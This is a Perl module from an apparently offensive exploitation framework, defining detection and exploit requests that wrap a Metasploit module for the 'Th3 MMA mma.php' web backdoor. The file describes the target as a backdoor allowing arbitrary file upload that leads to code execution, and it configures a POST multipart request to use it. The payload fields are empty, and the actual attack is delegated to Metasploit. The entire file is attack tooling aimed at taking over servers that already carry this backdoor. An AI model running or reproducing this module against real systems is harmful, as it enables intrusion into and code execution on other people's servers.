package MMA::MSF::MmaBackdoorUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MmaBackdoorUpload";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/',
  PAYLOAD => '',
  TEXT => 'Checking If : / Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits Th3 MMA mma.php Backdoor which allows an arbitrary file upload that

        leads to arbitrary code execution. This backdoor also echoes the Linux kernel version or

        operating system version because of the php_uname() function.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "mma_backdoor_upload",
  REFERENCES  => ["http://blog.pages.kr/1307"],
  TITLE       => "Th3 MMA mma.php Backdoor Arbitrary File Upload",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_923_3310440387_914130960',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
